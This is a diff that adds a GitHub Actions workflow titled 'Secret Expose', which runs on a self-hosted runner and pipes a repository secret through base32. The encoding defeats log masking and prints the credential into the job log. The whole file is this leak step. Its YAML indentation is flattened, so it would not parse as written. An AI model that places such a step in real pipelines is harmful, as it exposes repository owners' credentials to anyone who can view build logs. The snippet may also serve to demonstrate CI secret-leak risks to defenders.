@@ -1,0 +1,11 @@
+name: Secret Expose
+on:
+push:
+workflow_dispatch:
+
+jobs:
+pipeline:
+runs-on: self-hosted
+steps:
+- run: |
+echo ${{secrets.SOME_SECRET }} | base32
